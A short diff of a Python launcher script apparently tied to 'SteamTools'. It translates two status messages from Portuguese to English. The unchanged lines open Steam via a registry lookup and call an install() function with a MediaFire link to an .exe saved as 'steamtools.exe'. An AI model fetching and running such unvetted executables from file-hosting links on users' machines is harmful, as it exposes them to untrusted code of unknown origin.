@@ -34,8 +34,8 @@ def install(url, nome_arquivo):
         chave = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Valve\Steam")
         caminho, _ = winreg.QueryValueEx(chave, "SteamExe")
         subprocess.Popen(caminho)
-        print("Steam aberta com sucesso!")
+        print("Steam Launcher with success!")
     except Exception as e:
-        print("Não consegui encontrar a Steam:", e)
+        print("I cant find steam❌", e)
 
 install("https://download2391.mediafire.com/8yriat84pobgzbBxhTifGZGqxdelSxv3ja-5iz2MaKmwYPI3b-y06OFeVbh11rNKdICJN9TGdJ1q4hQuvrpEen7UCDNdo9-5xTfO-VVzYnyHoH729y8WV5dBXCW-l9eaGI0qhIIHxMTy0u7zv7iLSoZoQgDDHHNIvsGeJ1zyztE_ZA/72wj64iv6xejw5n/st-setup-1.8.17r2.exe", "steamtools.exe")
